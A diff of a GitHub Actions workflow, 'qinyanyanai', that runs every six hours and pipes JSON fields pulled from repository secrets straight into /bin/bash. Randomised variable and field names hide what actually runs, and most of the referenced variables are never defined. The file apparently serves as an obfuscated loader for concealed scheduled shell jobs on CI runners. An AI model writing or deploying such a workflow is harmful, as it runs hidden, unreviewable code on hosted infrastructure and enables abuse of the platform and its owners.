@@ -1,9 +1,8 @@
 name: qinyanyanai
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '9 1/6 * * *'
 
 jobs:
   build:
@@ -12,19 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: qinyanyanai
         env:
-          cyxx89: ${{ secrets.cyxx89 }}
+          d0: ${{ secrets.d0 }}
         run: |
-          echo $cyxx89 | jq -r .pglun61594 | /bin/bash
-          echo $khby02 | jq -r .a265 | /bin/bash
-          echo $s06 | jq -r .uwcl1185 | /bin/bash
-          echo $jdnj51280 | jq -r .hlx2121 | /bin/bash
-          echo $vzyo3 | jq -r .wbn94 | /bin/bash
-          echo $slic6 | jq -r .ogvgq72 | /bin/bash
-          echo $tzvk2747 | jq -r .fy8 | /bin/bash
-          echo $ppmqh8598 | jq -r .zpmz6 | /bin/bash
-          echo $q8115 | jq -r .n9293 | /bin/bash
-          echo $d16868 | jq -r .ew90 | /bin/bash
-          echo $idt7569 | jq -r .km6226 | /bin/bash
-          echo $n475 | jq -r .kxret95 | /bin/bash
-          echo $ud25 | jq -r .ktq9 | /bin/bash
+          echo $d0 | jq -r .u8 | /bin/bash
+          echo $zkyv9 | jq -r .fbiab4000 | /bin/bash
+          echo $ospf1 | jq -r .vrqkv37244 | /bin/bash
+          echo $bo37600 | jq -r .he4179 | /bin/bash
+          echo $agcfu96925 | jq -r .iq00 | /bin/bash
+          echo $nhztm686 | jq -r .wtqu4456 | /bin/bash
+          echo $jk11121 | jq -r .btng11032 | /bin/bash
 
